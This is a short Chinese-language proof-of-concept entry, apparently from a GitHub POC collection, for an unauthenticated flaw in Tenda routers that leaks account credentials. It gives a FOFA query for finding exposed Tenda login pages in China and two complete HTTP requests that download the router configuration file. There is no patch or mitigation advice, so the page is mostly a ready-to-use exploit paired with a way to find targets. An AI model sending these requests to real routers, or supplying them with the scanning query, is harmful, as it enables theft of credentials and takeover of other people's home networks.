# TendaT路由器账号密码泄露

>腾达无线路由器致力于为家庭用户提供舒适、便捷、自然的智慧家庭体验。

## 来源

[https://github.com/wy876/POC](https://github.com/wy876/POC/blob/d32f7fa15a779ac2032233799de698eb1c74b4d8/Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2.md)

## 简介

TendaT路由器存在信息泄露漏洞，未经身份验证的远程攻击者可以利用该漏洞获取到系统敏感信息。

## 漏洞类型

信息泄露

## 网络绘测

### fofa
```
title="Tenda | LOGIN" && country="CN"
```

## poc1
```http
GET /cgi-bin/DownloadCfg.jpg HTTP/1.1
Host: ip:port
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```

## poc2
```http
GET /cgi-bin/DownloadCfg/RouterCfm.jpg HTTP/1.1
Host: ip:port
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```
